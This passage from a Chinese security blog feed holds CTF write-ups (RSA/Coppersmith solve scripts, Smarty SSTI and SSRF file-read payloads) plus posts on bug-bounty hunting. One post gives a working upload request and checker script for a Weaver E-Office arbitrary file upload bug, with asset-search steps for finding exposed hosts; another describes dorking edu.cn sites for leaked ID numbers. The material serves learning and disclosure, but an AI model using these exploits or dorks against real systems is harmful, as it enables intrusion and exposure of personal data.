keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># LitCTF&#123;a1a8887793acfc199182a649e905daab&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="baby-xor"><a href="#baby-xor" class="headerlink" title="baby_xor"></a>baby_xor</h1><p>本来求出m但是解不出来，应该就是泄露的位数不够</p><p>找了一个爆破八位的脚本，虽然有点慢但还是出了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnumn <span class="token operator">=</span> <span class="token number">139167681803392690594490403105432649693546256181767408269202101512534988406137879788255103631885736461742577594980136624933914700779445704490217419248411578290305101891222576080645870988658334799437317221565839991979543660824098367011942169305111105129234902517835649895908656770416774539906212596072334423407</span>c1 <span class="token operator">=</span> <span class="token number">11201139662236758800406931253538295757259990870588609533820056210585752522925690049252488581929717556881067021381940083808024384402885422258545946243513996</span>c2 <span class="token operator">=</span> <span class="token number">112016152270171196606652761990170033221036025260883289104273504703557624964071464062375228351458191745141525003775876044271210498526920529385038130932141551598616579917681815276713386113932345056134302042399379895915706991873687943357627747262597883603999621939794450743982662393955266685255577026078256473601</span>high_p<span class="token operator">=</span><span class="token punctuation">(</span>c1<span class="token operator">>></span><span class="token number">256</span><span class="token punctuation">)</span><span class="token comment">#这个脚本是位数不够时爆破八位然后恢复p的脚本，</span>kbits<span class="token operator">=</span><span class="token number">256</span><span class="token operator">-</span><span class="token number">8</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>high_p<span class="token operator">=</span>high_p<span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 要爆破的8位二进制数，为2**8==256，表示0~255</span>    p <span class="token operator">=</span> high_p <span class="token operator">&lt;&lt;</span> kbits    f <span class="token operator">=</span> x <span class="token operator">+</span> p    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span>beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>epsilon<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>        p<span class="token operator">=</span> p <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>        m<span class="token operator">=</span>c1<span class="token punctuation">.</span>__xor__<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    high_p<span class="token operator">=</span>high_p<span class="token operator">+</span><span class="token number">1</span><span class="token comment"># LitCTF&#123;oh!!!!coppersmith_is_fun&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LitCTF2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞盒子公益SRC第一次挖掘</title>
      <link href="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/"/>
      <url>/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="了解漏洞盒子公益SRC"><a href="#了解漏洞盒子公益SRC" class="headerlink" title="了解漏洞盒子公益SRC"></a>了解漏洞盒子公益SRC</h1><p>当时也是打比赛打累了，刚好那周的周末没有比赛，然后就想了解一下漏洞盒子的漏洞提交机制以及都可以提交什么类型的漏洞。里面有很多的企业SRC但是以我弱弱的能力肯定也挖不到，就想先用Nday打几个公益SRC。</p><h1 id="漏洞文库"><a href="#漏洞文库" class="headerlink" title="漏洞文库"></a>漏洞文库</h1><p>我经常用的漏洞文库是PeiQi文库</p><p><a href="http://api.orchidstudio.cn/">http://api.orchidstudio.cn/</a></p><p>有很多类型的漏洞</p><p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506010835564.png" alt="image-20230506010835564"></p><h1 id="第一次利用Nday（漏洞复现）"><a href="#第一次利用Nday（漏洞复现）" class="headerlink" title="第一次利用Nday（漏洞复现）"></a>第一次利用Nday（漏洞复现）</h1><p>我第一次打的是泛微OA E-Office UploadFile.php 任意文件上传漏洞</p><p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011028027.png" alt="image-20230506011028027"></p><p>通过POST方式上传文件</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;general&#x2F;index&#x2F;UploadFile.php?m&#x3D;uploadPicture&amp;uploadType&#x3D;eoffice_logo&amp;userId&#x3D; HTTP&#x2F;1.1Host: User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36Accept-Encoding: gzip, deflateAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Connection: closeAccept-Language: zh-CN,zh-TW;q&#x3D;0.9,zh;q&#x3D;0.8,en-US;q&#x3D;0.7,en;q&#x3D;0.6Cookie: LOGIN_LANG&#x3D;cn; PHPSESSID&#x3D;0acfd0a2a7858aa1b4110eca1404d348Content-Length: 193Content-Type: multipart&#x2F;form-data; boundary&#x3D;e64bdf16c554bbc109cecef6451c26a4--e64bdf16c554bbc109cecef6451c26a4Content-Disposition: form-data; name&#x3D;&quot;Filedata&quot;; filename&#x3D;&quot;test.php&quot;Content-Type: image&#x2F;jpeg&lt;?php phpinfo();?&gt;--e64bdf16c554bbc109cecef6451c26a4--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传成功的话会出现以下页面</p><p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011412143.png" alt="image-20230506011412143"></p><p>然后我们访问</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;images&#x2F;logo&#x2F;logo-eoffice.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就会成功访问phpinfo</p><p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011551616.png" alt="image-20230506011551616"></p><p>说明漏洞存在并可以利用</p><h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><p>我常用的是fofa和hunter</p><p>在PeiQi文库这个地方有网络测绘，直接复制搜索</p><p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506011820951.png" alt="image-20230506011820951"></p><p>以fofa举例</p><p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506012132428.png" alt="image-20230506012132428"></p><p>收集完资产后可以对资产进行检测是否存在漏洞</p><h1 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h1><p>如果我们通过一个一个复现的方法显然太慢，所以可以下脚本批量检测，这里我贴一个脚本检测的，但不是批量的，批量检测大家可以试着自己写写</p><p>首先就是要通过python的requests模块可以先把BP的post包copy为</p><p><img src="/2023/05/06/%E6%BC%8F%E6%B4%9E%E7%9B%92%E5%AD%90%E5%85%AC%E7%9B%8ASRC%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230506012618843.png" alt="image-20230506012618843"></p><p>然后通过写脚本观察返回包是否含有logo-eoffice.php，来判断是否存在漏洞</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment">#_*_ coding:utf-8 _*_</span><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">efff</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        burp0_url <span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>url<span class="token operator">+</span><span class="token string">"/general/index/UploadFile.php?m=uploadPicture&amp;uploadType=eoffice_logo&amp;userId="</span>        burp0_cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"LOGIN_LANG"</span><span class="token punctuation">:</span> <span class="token string">"cn"</span><span class="token punctuation">,</span> <span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"0acfd0a2a7858aa1b4110eca1404d348"</span><span class="token punctuation">&#125;</span>        burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"</span><span class="token punctuation">&#125;</span>        burp0_data <span class="token operator">=</span> <span class="token string">"--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php phpinfo();?>\r\n\r\n--e64bdf16c554bbc109cecef6451c26a4--\r\n"</span>        cd<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>burp0_cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'logo-eoffice.php'</span> <span class="token keyword">in</span> cd<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'存在漏洞'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>url<span class="token operator">=</span><span class="token string">'127.0.0.1'</span>efff<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果可以上传logo-eoffice.php，在通过是否能访问phpinfo判断漏洞是否可以利用</p><h1 id="漏洞报告"><a href="#漏洞报告" class="headerlink" title="漏洞报告"></a>漏洞报告</h1><p>在写漏洞盒子的漏洞报告时，我的建议是尽量写详细点，像漏洞描述、漏洞修复建议写详细点，到时候评报告质量，相同的漏洞报告质量越高到时候得到的积分可能就越多</p><h1 id="挖洞建议"><a href="#挖洞建议" class="headerlink" title="挖洞建议"></a>挖洞建议</h1><p>有的时候挖到漏洞不要尝试深度利用，能够证明漏洞存在就行。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 公益src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>edusrc的第一次挖掘</title>
      <link href="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/"/>
      <url>/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="edusrc账号获得"><a href="#edusrc账号获得" class="headerlink" title="edusrc账号获得"></a>edusrc账号获得</h1><p>可以通过内部的邀请码然后注册账号，再或者就是非邀请码注册，但是需要你提交一个漏洞审核过之后就会给你发邮件账号密码都在邮件里，当然第一个漏洞审核的非常快，最迟第二天就审核完成了。</p><h1 id="挖掘的开始"><a href="#挖掘的开始" class="headerlink" title="挖掘的开始"></a>挖掘的开始</h1><p>在前段时间的下午第一次先尝试挖edusrc，然后浏览一下别人的挖掘思路，然后晚上就自己开始尝试了，当然也顺利拿到属于自己的edusrc账号。</p><h1 id="挖掘类型的确定"><a href="#挖掘类型的确定" class="headerlink" title="挖掘类型的确定"></a>挖掘类型的确定</h1><p>对于我这种菜鸡当然要从信息泄露挖起，首先就选择了挖身份信息泄露，首先通过谷歌语法</p><pre class="line-numbers language-none"><code class="language-none">site:edu.cn 身份证号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当然现在这种漏洞已经很少了</p><pre class="line-numbers language-none"><code class="language-none">site:edu.cn 四六级成绩site:edu.cn 计算机等级考试成绩<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后通过筛选就能下载成绩单的地方</p><p><img src="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230505155609536.png" alt="image-20230505155609536"></p><p>然后通过这种链接下载成绩单</p><p>上面有的会直接有sfz号，基本都有证书编号，姓名，然后可以通过中国考试教育网查询信息，上面会含有身份信息。</p><p>晚上提交第二天早上就审核通过了，账号到手。</p><p>该网站漏洞已经被修复，不要在尝试挖该站点的漏洞</p><p>但是通过上述收集信息的方式已经被人打烂了，现在在用这种方式去挖基本上全是重复，所以可以尝试其他思路进行挖掘。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> edusrc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 HDCTF</title>
      <link href="/2023/04/22/2023-HDCTF/"/>
      <url>/2023/04/22/2023-HDCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h2><p>随便点点就弹出flag了</p><p><img src="/2023/04/22/2023-HDCTF/image-20230422130844824.png" alt="image-20230422130844824"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;We13ome_t@_HDCTF_2o23&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h2><p>首先扫描目录</p><p><img src="/2023/04/22/2023-HDCTF/image-20230422131014866.png" alt="image-20230422131014866"></p><p>访问</p><p><img src="/2023/04/22/2023-HDCTF/image-20230422131048842.png" alt="image-20230422131048842"></p><p>应该是smarty  ssti在根据题目提示用post传data</p><pre class="line-numbers language-none"><code class="language-none">data&#x3D;&#123;if system(&#39;ls &#x2F;&#39;)&#125;&#123;&#x2F;if&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/04/22/2023-HDCTF/image-20230422131231234.png" alt="image-20230422131231234"></p><pre class="line-numbers language-none"><code class="language-none">data&#x3D;&#123;if system(&#39;cat &#x2F;flag_13_searchmaster&#39;)&#125;&#123;&#x2F;if&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/04/22/2023-HDCTF/image-20230422131304639.png" alt="image-20230422131304639"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;204f2649-fb8f-4bd5-bd14-3940f2d5b780&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h2><p>根据题目提示</p><pre class="line-numbers language-none"><code class="language-none">I wanna eat some yummy food :(can you give me some?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>应该是先看看cookie</p><pre class="line-numbers language-none"><code class="language-none">eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZENVMw.8YLXYcxD4iC4qGOrbXC2SdlHJiE&#123;&quot;passport&quot;:&quot;YamiYami&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这解码之后也没用呀</p><p>然后就去看了文件上传的地方发现.php文件都可以上传，但是没有给文件路径还是不好搞</p><p>又去看了看pwd 发现页面有个  &#x2F;app联想到ssti</p><p>无论怎么我去注入但是不成功</p><p>所以这应该是先上传文件然后，在去ssti，尝试了无数次方法就是出不来</p><p>然后去做了一个签到re</p><p>回来发现一直忽略了Read something  这是个url跳转</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;read?url&#x3D;https:&#x2F;&#x2F;baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>刚开始就直接把他忽略，但是再次看发现read,就想着能不能读取文件，试了伪协议不行，又卡了然后就看到一篇文章可以读取环境变量，就尝试了一下结果真出了</p><p><img src="/2023/04/22/2023-HDCTF/image-20230422133632643.png" alt="image-20230422133632643"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;read?url&#x3D;file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/04/22/2023-HDCTF/image-20230422133535890.png" alt="image-20230422133535890"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;449ff62b-d28a-4fd0-9e20-fe20e292df51&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h2><p>flag直接在题目代码里  一血</p><p><img src="/2023/04/22/2023-HDCTF/image-20230422131417557.png" alt="image-20230422131417557"></p><pre class="line-numbers language-none"><code class="language-none">HDCTF&#123;0b3663ed-67e4-44e2-aee7-7c2d8665b63c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Normal-Rsa-revenge"><a href="#Normal-Rsa-revenge" class="headerlink" title="Normal_Rsa(revenge)"></a>Normal_Rsa(revenge)</h2><p>因为p是256位，q,r是512位</p><p>所以直接对P,Q开方就得到p,q  (一血)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749</span>c <span class="token operator">=</span> <span class="token number">7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785</span>e<span class="token operator">=</span><span class="token number">65537</span>p<span class="token operator">=</span><span class="token number">93595995503882796484948942664787567679411018850571035558047095185699253142469</span>q<span class="token operator">=</span><span class="token number">10626484086425759109526601843431131274302413270645909659804218687679714714707826956012068057535486307660248767234433303462363381171495481245390248120740549</span>r<span class="token operator">=</span>n<span class="token operator">//</span>p<span class="token operator">//</span>q<span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># HDCTF&#123;08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="爬过小山去看云"><a href="#爬过小山去看云" class="headerlink" title="爬过小山去看云"></a>爬过小山去看云</h2><p>三血</p><pre class="line-numbers language-none"><code class="language-none">密文：ymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne在山的那头，有3个人，4只鸟，19只羊，11朵云<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>很明显的希尔（hill）密码</p><p>得到</p><pre class="line-numbers language-none"><code class="language-none">yourpiniseightfourtwozeroeightfourtwoonezeroeighteightfourzerotwofourzeroeightfourzeroonezeroonetwofourx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读其中的内容得</p><pre class="line-numbers language-none"><code class="language-none">842084210884024084010124<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>又是很明显的云影密码</p><p>由于很短直接手撸</p><pre class="line-numbers language-none"><code class="language-none">842 8421 884 24 84 1 12414 15 20 6 12 1 7ABCDEFGHIJKLMNOPQRSTUVWXYZNOTFLAGNSSCTF&#123;NOTFLAG&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Math-Rsa"><a href="#Math-Rsa" class="headerlink" title="Math_Rsa"></a>Math_Rsa</h2><p>简单构造一个多项式环就OK了</p><p>a&#x3D;pow(p,2,r)</p><p>$ a \equiv p^2 mod r$</p><p>a，r已知求p,构造多项式环</p><p>$f&#x3D;p^2-a$</p><p>求出来p之后就是普通的RSA了</p><p>sage脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span>  gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489</span>r <span class="token operator">=</span> <span class="token number">145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span>a <span class="token operator">=</span> <span class="token number">55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span>c <span class="token operator">=</span> <span class="token number">12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608</span>e<span class="token operator">=</span><span class="token number">65537</span>P<span class="token punctuation">.</span><span class="token operator">&lt;</span>p<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token operator">=</span>p<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>af<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>q<span class="token operator">=</span>n<span class="token operator">//</span>pphi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">HDCTF&#123;0ce04f81-516b-4132-81a2-b0b7166e03ad&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h2><p>首先进行脱壳处理</p><p>然后扔进IDA</p><p>发现base64</p><p><img src="/2023/04/22/2023-HDCTF/image-20230422101827552.png" alt="image-20230422101827552"></p><p>解码即可</p><pre class="line-numbers language-none"><code 